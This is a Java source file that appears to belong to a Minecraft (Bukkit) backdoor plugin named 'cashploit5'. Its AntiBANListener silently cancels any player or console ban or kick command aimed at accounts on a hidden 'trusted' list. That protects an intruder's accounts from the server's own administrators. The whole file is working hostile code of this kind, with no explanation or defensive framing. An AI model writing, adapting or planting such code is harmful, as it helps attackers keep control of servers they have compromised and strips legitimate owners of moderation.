package de.cashploit5.events;

import org.bukkit.OfflinePlayer;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.server.ServerCommandEvent;

import de.cashploit5.Main;
import de.cashploit5.command.TrustCommand;
import de.cashploit5.uuidmanager.UUIDManager;

public class AntiBANListener implements Listener {
	
	public AntiBANListener(Main main) {
		main.getServer().getPluginManager().registerEvents(this, main);
	}
	
	@EventHandler
	public void onCommand(PlayerCommandPreprocessEvent e) {
		if(e.getMessage().split(" ")[0].contains("ban") || e.getMessage().split(" ")[0].contains("kick")) {
			if(e.getMessage().split(" ").length >= 2) {
				OfflinePlayer target = UUIDManager.getOfflinePlayer(e.getMessage().split(" ")[1]);
				if(target != null) {
					if(TrustCommand.getTrustedPlayers().contains(target)) {
						e.setCancelled(true);
					}
				}
			}
		}
	}
	
	@EventHandler
	public void onServerCommand(ServerCommandEvent e) {
		if(e.getCommand().split(" ")[0].contains("ban") || e.getCommand().split(" ")[0].contains("kick")) {
			if(e.getCommand().split(" ").length >= 2) {
				OfflinePlayer target = UUIDManager.getOfflinePlayer(e.getCommand().split(" ")[1]);
				if(target != null) {
					if(TrustCommand.getTrustedPlayers().contains(target)) {
						e.setCancelled(true);
					}
				}
			}
		}
	}
}
